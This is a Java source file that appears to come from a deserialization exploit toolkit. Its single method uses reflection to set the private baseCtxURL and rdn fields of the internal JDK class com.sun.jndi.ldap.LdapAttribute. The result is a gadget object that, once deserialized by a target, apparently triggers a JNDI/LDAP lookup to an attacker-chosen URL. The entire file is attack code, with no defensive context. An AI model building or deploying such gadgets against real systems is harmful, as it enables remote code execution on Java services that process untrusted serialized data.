package gadgets;

import common.Reflections;

import javax.naming.CompositeName;

public class LdapAttributeNode {

    public static Object makeGadget(String baseCtxURL,String rdn) throws Exception {
        Object attribute = Reflections.newInstance("com.sun.jndi.ldap.LdapAttribute",new Class[]{String.class},new Object[]{"c"});
        Reflections.setFieldValue(attribute,"baseCtxURL",baseCtxURL);
        Reflections.setFieldValue(attribute,"rdn", new CompositeName(rdn + "//b"));
        return attribute;
    }
}
